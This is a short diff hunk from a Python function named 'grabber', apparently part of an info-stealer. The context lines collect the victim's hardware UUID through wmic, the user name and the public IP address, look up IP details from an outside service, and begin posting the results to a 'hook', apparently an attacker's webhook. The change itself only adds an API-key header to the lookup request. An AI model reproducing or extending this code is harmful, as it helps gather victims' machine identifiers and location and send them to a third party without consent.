@@ -63,7 +63,7 @@ def grabber():
         hwid = str(subprocess.check_output('wmic csproduct get uuid')).split('\\r\\n')[1].strip('\\r').strip()
         pcname = os.path.expanduser("~")[9:]
         ip = requests.get('https://api.ipify.org/').text
-        data = requests.get(f"https://api.xtekky.com/ip-info/{ip}").json()
+        data = requests.get(f"https://api.xtekky.com/ip-info/{ip}", headers={'X-API-KEY': 'test'}).json()
 
         # -------------------* hook *-------------------#
         requests.post(hook, json={
